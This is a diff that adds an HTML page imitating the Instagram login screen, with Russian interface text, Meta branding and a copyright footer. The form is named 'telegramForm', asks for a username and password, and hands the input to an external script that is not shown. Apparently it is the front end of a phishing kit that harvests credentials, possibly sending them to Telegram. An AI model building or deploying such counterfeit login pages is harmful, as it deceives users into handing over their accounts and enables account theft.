@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- CSS -->
+    <link rel="stylesheet" href="./style.css">
+
+    <!-- ICON -->
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+
+    <!-- FONTAWESOME -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+
+    <title>Instagram</title>
+</head>
+
+<body>
+
+<main class="flex align-items-center justify-content-center">
+
+    <!-- Loading -->
+    <div id="loading" class="loading-overlay" style="display: none;">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <!-- Mobile -->
+    <section id="mobile" class="flex"></section>
+
+    <!-- AUTH -->
+    <section id="auth" class="flex direction-column">
+
+        <!-- LOGIN -->
+        <div class="panel login flex direction-column">
+
+            <h1 class="flex justify-content-center">
+                <img src="./img/instagram-logo.png" alt="Instagram">
+            </h1>
+
+            <form id="telegramForm">
+                <label class="sr-only" for="username">Username</label>
+                <input id="username" name="email" placeholder="account username" autocomplete="username">
+                <label class="sr-only" for="password">Password</label>
+                <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password">
+                <button type="submit">Войти</button>
+            </form>
+
+            <!-- SEPARATOR -->
+            <div class="flex separator align-items-center">
+                <span></span>
+                <div class="or">ИЛИ</div>
+                <span></span>
+            </div>
+
+            <!-- FACEBOOK -->
+            <div class="login-with-fb flex direction-column align-items-center">
+                <div class="wrapper">
+                    <i class="fa-brands fa-square-facebook"></i>
+                    <a href="#">Войти через Facebook</a>
+                    <p class="invalid">К сожалению, вы ввели неправильный пароль.</p>
+                </div>
+                <a href="#">Забыли пароль?</a>
+            </div>
+
+        </div>
+
+        <!-- REGISTER -->
+        <div class="panel register flex justify-content-center align-items-center">
+            <p>Нет аккаунта?</p>
+            <a href="#">Зарегистрироваться</a>
+        </div>
+
+        <!-- APP DOWNLOAD -->
+        <div class="app-download flex direction-column align-items-center">
+            <p>Скачайте приложение.</p>
+            <div class="flex">
+                <a href="#"><img src="./img/app-store.png" alt="App Store"></a>
+                <a href="#"><img src="./img/google-play.png" alt="Google Play"></a>
+            </div>
+        </div>
+
+    </section>
+</main>
+
+<!-- FOOTER -->
+<footer>
+    <ul class="footer__list flex flex-wrap">
+        <li><a href="#">Meta</a></li>
+        <li><a href="#">О нас</a></li>
+        <li><a href="#">Блог</a></li>
+        <li><a href="#">Вакансии</a></li>
+        <li><a href="#">Помощь</a></li>
+        <li><a href="#">API</a></li>
+        <li><a href="#">Конфиденциальность</a></li>
+        <li><a href="#">Условия</a></li>
+        <li><a href="#">Места</a></li>
+        <li><a href="#">Instagram Lite</a></li>
+        <li><a href="#">Threads</a></li>
+        <li><a href="#">Загрузка контактов и не-пользователи</a></li>
+        <li><a href="#">Meta Verified</a></li>
+    </ul>
+    <p class="copyright">© 2025 Instagram from Meta</p>
+</footer>
+
+<script src="script.js"></script>
+
+</body>
+</html>
